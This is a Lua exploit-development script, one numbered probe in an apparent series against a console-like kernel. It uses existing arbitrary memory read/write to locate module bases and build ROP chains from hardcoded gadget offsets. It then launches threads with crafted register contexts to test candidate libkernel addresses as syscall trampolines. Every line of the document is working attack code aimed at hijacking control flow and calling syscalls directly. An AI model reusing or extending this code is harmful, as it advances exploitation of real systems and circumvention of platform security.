-- CRASH_CLASS: MODERATE
-- PROBE 532m: Test single libkernel gadget as syscall trampoline
--
-- From 532k: libkernel relro has GOT entries pointing to text+0x000D0,
-- +0x003A0, +0x02D50. If any is a `syscall; ret` gadget, jumping to it
-- with rax=20 should return pid. Test ONE at a time to isolate crashes.
--
-- Also: test the KNOWN fn_addr (loader's syscall gadget) from child thread
-- as baseline.

print("=== PROBE 532m: LK GADGET TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local fn_addr = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
local pid = to_num(pid_v)
print("pid=" .. pid)

-- Get bases
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("lk=" .. q(lk))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local jmp_self = eb + uint64(0x15481)

print("fn_addr=" .. q(fn_addr))

-- Helper: spawn child that does sysarch + one syscall gadget test + store result
local function test_gadget(label, gadget_addr)
    local shared = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(shared, 64)
    wq(shared, uint64(0xDEAD))

    local stack = sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))

    local tcb = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for toff = 0, 0x100, 8 do wq(tcb + toff, tcb) end
    local tcb_ptr = memory.alloc(8); wq(tcb_ptr, tcb)

    local chain = stack + uint64(0x40000 - 0x200)
    local i = 0
    local function emit(v) wq(chain + uint64(i), v); i = i + 8 end

    -- sysarch(129, &tcb) via known-good fn_addr
    emit(uint64(165))   -- rax for sysarch
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb_ptr)
    emit(fn_addr)       -- known working syscall gadget

    -- getpid(20) via TEST gadget
    emit(pop_rax_ret); emit(uint64(20))
    emit(gadget_addr)   -- THIS is what we're testing

    -- store rax (getpid result) into shared
    emit(pop_rdi_ret); emit(shared)
    emit(mov_rdi_rax_ret)

    -- park
    emit(jmp_self)

    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + 0x108, uint64(0x480))
    wd(ctx + 0x0D0, 0)
    wq(ctx + 0x110, uint64(0x10000))
    wq(ctx + 0x0C0, uint64(0x43))
    wq(ctx + 0x100, uint64(0x3B))
    wq(ctx + 0x0F0, uint64(0x202))
    wq(ctx + 0x0E0, pop_rax_ret)
    wq(ctx + 0x0F8, chain)

    local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
    local ok_tc, rv = pcall(function()
        return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
    end)

    -- Wait 500ms
    local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, uint64(500000000))
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    local result = rq(shared)
    local rn = to_num(result); if rn < 0 then rn = rn + 0x100000000 end

    local status
    if rn == 0xDEAD then
        status = "CRASHED"
    elseif rn == pid then
        status = "PID_MATCH (WORKS!)"
    elseif rn > 0 and rn < 0x100000 then
        status = string.format("val=%d (pid-like)", rn)
    else
        status = q(result)
    end
    print(string.format("  %s: %s  rv=%s", label, status, ok_tc and q(rv) or "pcall_fail"))
end

-- [A] Baseline: fn_addr from loader (known working from child)
print("")
print("[A] Baseline: fn_addr (known working)")
test_gadget("fn_addr", fn_addr)

-- [B] Test lk+0x000D0
print("")
print("[B] lk+0x000D0")
test_gadget("lk+0xD0", lk + uint64(0x000D0))

-- [C] Test lk+0x003A0
print("")
print("[C] lk+0x003A0")
test_gadget("lk+0x3A0", lk + uint64(0x003A0))

-- [D] Test lk+0x02D50
print("")
print("[D] lk+0x02D50")
test_gadget("lk+0x2D50", lk + uint64(0x02D50))

print("")
print("=== 532m DONE ===")
